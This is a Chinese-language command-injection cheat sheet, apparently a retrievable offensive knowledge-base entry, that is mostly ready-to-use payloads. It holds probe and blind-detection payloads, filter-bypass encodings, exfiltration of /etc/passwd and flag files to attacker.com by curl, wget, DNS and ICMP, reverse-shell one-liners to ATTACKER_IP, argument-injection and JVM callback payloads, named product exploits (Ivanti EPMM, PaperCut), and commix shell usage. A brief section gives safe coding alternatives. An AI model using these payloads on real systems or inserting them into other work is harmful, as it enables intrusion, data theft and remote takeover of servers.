---
category: web
tags: [command_injection, os_injection, rce, 命令注入, 命令执行, shell_injection, code_execution, 远程代码执行, bypass, 绕过, blind_injection, 盲注, oob, 带外]
triggers: [command injection, os command, rce, remote code execution, system, exec, popen, passthru, shell_exec, subprocess, child_process, ping, nslookup, curl, wget, eval, backtick, 命令注入, 命令执行, 远程代码执行, cmd, ?cmd=, ?exec=, ?ping=, ?ip=]
related: [sqli, ssti, lfi, ssrf, nosql_injection, prototype_pollution, websocket, race_condition]
---

# 命令注入 (Command Injection)

## 什么时候用

应用将用户输入拼接进系统命令执行（shell 命令或系统调用），且未做充分过滤/转义。常见场景：

- **网络诊断功能**：ping、traceroute、nslookup、whois 输入框
- **文件处理**：调用系统工具做格式转换（ImageMagick、ffmpeg、pandoc）
- **管理面板**：运维工具、数据库备份、日志查看
- **隐蔽参数**：URL 中的 `?cmd=`、`?exec=`、`?ping=`、`?ip=`、`?query=`、`?func=` 等

## 前提条件

- 存在可控输入传入命令执行函数（GET/POST/Header/Cookie/文件名等）
- 后端使用了 shell 执行方式（非 `execve` 直接调用）或存在参数注入场景
- 了解目标 OS（Linux vs Windows，注入符号不同）

## 攻击步骤

### 1. 基本注入符号

所有符号的核心思路：**截断原有命令，附加自己的命令。**

```bash
# ===== Unix & Windows 通用 =====
cmd1 | cmd2        # 管道，两条都执行，只显示 cmd2 输出
cmd1 || cmd2       # cmd1 失败才执行 cmd2
cmd1 && cmd2       # cmd1 成功才执行 cmd2
cmd1 & cmd2        # 后台执行 cmd1，立即执行 cmd2

# ===== 仅 Unix =====
cmd1 ; cmd2        # 顺序执行，无论成败
`cmd2`             # 反引号，命令替换
$(cmd2)            # $() 命令替换（可嵌套）

# ===== 换行符 =====
cmd1 %0a cmd2      # URL 编码的换行 \n，推荐用法
cmd1 %0d%0a cmd2   # \r\n

# ===== 输出重定向 =====
cmd > /var/www/html/out.txt   # 结果写入 web 可访问文件
cmd < /etc/passwd             # 文件内容作为输入
```

**快速探测 payload**：

```
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 & id
127.0.0.1 && id
127.0.0.1 || id
127.0.0.1 %0a id
`id`
$(id)
```

### 2. 盲注检测（无回显确认漏洞）

当注入成功但看不到输出时，使用时间或网络信号确认。

#### 基于延时

```bash
; sleep 5           # 响应延迟 5 秒 → 存在注入
| sleep 5
& sleep 5
%0a sleep 5
$(sleep 5)
`sleep 5`

# Windows
& ping -n 6 127.0.0.1          # 约 5 秒延迟
& timeout /T 5
```

#### 基于 DNS/HTTP 外带（OOB）

```bash
# DNS 外带 — 用 Burp Collaborator / interactsh / dnsbin.zhack.ca
; nslookup attacker.com
; host $(whoami).attacker.com
; dig $(whoami).attacker.com

# 逐目录 DNS 外带
for i in $(ls /); do host "$i.YOUR_SUBDOMAIN.oast.fun"; done

# HTTP 外带
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(cat /etc/passwd | base64)
```

#### 基于时间的数据逐字符提取

```bash
# 第 1 个字符是 's' → 延迟 5 秒
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi

# 自动化脚本思路
for c in {a..z}; do
  time if [ $(whoami|cut -c 1) == $c ]; then sleep 2; fi
done
```

### 3. 空格绕过

后端过滤了空格时的替代方案：

```bash
# $IFS — 默认值为 空格+Tab+换行
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# {cmd,arg} — Brace expansion
{cat,/etc/passwd}
{ls,-la,/tmp}

# Tab（%09）
cat%09/etc/passwd

# 换行（%0a）
cat%0a/etc/passwd

# < 重定向代替空格
cat</etc/passwd

# $IFS$9 — $9 为空，只起分隔作用
cat${IFS}${9}/etc/passwd
```

### 4. 关键词/字符绕过

后端黑名单过滤了 `cat`、`flag`、`etc`、`passwd` 等关键词时：

```bash
# ===== 通配符 =====
/bin/ca? /etc/pas?wd           # ? 匹配单个字符
cat /etc/pass*                 # * 匹配任意字符
/???/??t /???/??ss??           # 极端通配：/bin/cat /etc/passwd

# ===== 变量拼接 =====
a=c;b=at;$a$b /etc/passwd     # c + at = cat
c=ca;d=t;${c}${d} /etc/passwd

# ===== 反斜杠/引号中断 =====
c\at /etc/passwd               # 反斜杠不影响执行
c''at /etc/passwd              # 空单引号
c""at /etc/passwd              # 空双引号

# ===== Base64 编码 =====
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
# Y2F0IC9ldGMvcGFzc3dk = "cat /etc/passwd"

# ===== $() 嵌套 / 变量切片 =====
$(echo cat) /etc/passwd
${PATH:0:1}           # 取 PATH 的第 1 个字符 '/'
${LS_COLORS:10:1}     # 取 LS_COLORS 某位置的字符

# ===== 十六进制/八进制 =====
$(printf '\x63\x61\x74') /etc/passwd    # hex: cat
$(printf '\143\141\164') /etc/passwd    # oct: cat

# ===== rev 反转 =====
echo 'dwssap/cte/ tac' | rev | bash
```

### 5. 无回显数据外带

```bash
# 写入 webroot
cat /etc/passwd > /var/www/html/out.txt

# curl POST 外带
curl -X POST -d @/etc/passwd http://attacker.com/exfil

# wget 外带
wget --post-file=/etc/passwd http://attacker.com/exfil

# DNS 外带（适合短数据）
host "$(whoami).attacker.com"
dig "$(cat /flag | xxd -p | head -c 60).attacker.com"

# ICMP 外带（限制较多，适合无 DNS 环境）
xxd -p /flag | xargs -I{} ping -c 1 -p {} attacker.com
```

### 6. 反弹 Shell

确认注入后获取交互式 shell：

```bash
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

## 各语言常见危险函数

### PHP

```php
system("ping " . $_GET['ip']);          // 直接执行，有回显
exec("ping " . $_GET['ip'], $out);     // 有回显（数组）
passthru("ping " . $_GET['ip']);       // 直接输出原始数据
shell_exec("ping " . $_GET['ip']);     // 等价 ``
popen("ping " . $_GET['ip'], "r");    // 返回文件指针
proc_open(...);                        // 最灵活，双向管道
pcntl_exec("/bin/bash", ["-c", $cmd]); // 直接 execve
```

**PHP 安全写法**：`escapeshellarg()` + `escapeshellcmd()`，或完全避免 shell。

### Python

```python
os.system("ping " + ip)                # 通过 shell 执行
os.popen("ping " + ip)                 # 通过 shell，返回文件对象
subprocess.call("ping " + ip, shell=True)
subprocess.Popen("ping " + ip, shell=True)
# ⚠️ shell=True 是关键 — 设为 False 且用列表传参即安全
```

**Python 安全写法**：`subprocess.run(["ping", ip], shell=False)`

### Node.js

```javascript
const { exec } = require('child_process');
exec(`ping ${ip}`, callback);          // 通过 /bin/sh -c，危险
// exec 会启动 shell，所有 shell 元字符均可注入

const { execFile } = require('child_process');
execFile('ping', [ip], callback);      // 不启动 shell，安全
```

**真实案例**：Synology Photos ≤ 1.7.0 通过 WebSocket 事件将用户输入传入 `exec()` 调用实现 RCE（Pwn2Own Ireland 2024）。

### Java

```java
Runtime.getRuntime().exec("ping " + ip);     // 简单形式走 shell
Runtime.getRuntime().exec(new String[]{"ping", ip}); // 数组形式不走 shell
```

## 常见坑

- **引号上下文**：如果输入在引号内（`"$input"` 或 `'$input'`），需先闭合引号再注入：`"; id; #` 或 `'; id; #`
- **只过滤了 `;`**：别忘了 `|`、`||`、`&&`、`%0a`、反引号、`$()`
- **空格被吃掉**：用 `$IFS`、`%09`、`{cmd,arg}` 替代
- **stdout 被丢弃**：用 stderr 重定向 `2>&1`，或用盲注/外带
- **命令不存在**：容器/最小化系统可能没有 `nc`/`wget`/`curl`，用 `/dev/tcp` 或 Python 替代
- **Windows vs Linux**：`|` `||` `&&` `&` 两平台通用，`;` `$()` `` ` `` 仅 Unix
- **WAF/过滤**：逐步升级绕过：换行 → Tab → $IFS → 变量拼接 → Base64 → 通配符

## 变体

### 参数/选项注入（Argument Injection）

不需要 shell 元字符，通过 `-` / `--` 开头的输入操控目标程序行为：

```bash
# curl 参数注入 — 写文件
curl --output /tmp/evil.sh http://attacker.com/payload.sh

# tar 参数注入 — 检查点执行
tar --checkpoint=1 --checkpoint-action=exec=id

# find 参数注入
find / -exec /bin/sh -c 'id' \;

# git 参数注入
git -c core.sshCommand='id' clone ssh://attacker.com/repo
```

### JVM 诊断回调注入

注入 JVM 参数实现 RCE，不需要 shell 元字符：

```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="curl http://attacker/shell.sh | sh"
```

原理：强制 OOM → 触发 `OnOutOfMemoryError` 回调执行系统命令。

### Bash 算术扩展注入

Bash `[[ $a -gt $b ]]`、`$((...))` 等算术上下文会二次展开变量：

```bash
# Ivanti EPMM RewriteMap 案例
curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']"
```

算术上下文将未知 token 当作变量/数组标识符处理，绕过简单的元字符过滤。

### PaperCut 打印脚本 RCE

认证绕过 + 打印脚本启用 → Java Runtime.exec()：

```javascript
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```

## 常见易受攻击参数名

```
?cmd= ?exec= ?command= ?execute= ?ping= ?query= ?ip=
?jump= ?code= ?reg= ?do= ?func= ?arg= ?option=
?load= ?process= ?step= ?read= ?function= ?req=
?feature= ?exe= ?module= ?payload= ?run= ?print=
```

## 自动化工具

```bash
# commix — 自动命令注入检测与利用
commix -u "http://target/page?ip=127.0.0.1"
commix -u "http://target/page" --data="ip=127.0.0.1"
commix -u "http://target/page?ip=127.0.0.1" --os-shell

# Burp Intruder — 用 SecLists 命令注入字典
# /usr/share/seclists/Fuzzing/command-injection-commix.txt
```

## 相关技术

- [[sqli]] — 同为注入类漏洞，测试思路相似（拼接 → 闭合 → 注入）
- [[ssti]] — 模板注入，某些引擎可通过模板语法执行命令（如 Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`）
- [[lfi]] — 文件包含可读取源码发现命令注入点，或配合日志/session 注入实现 RCE
- [[ssrf]] — SSRF 可访问内部服务，结合命令注入扩大攻击面
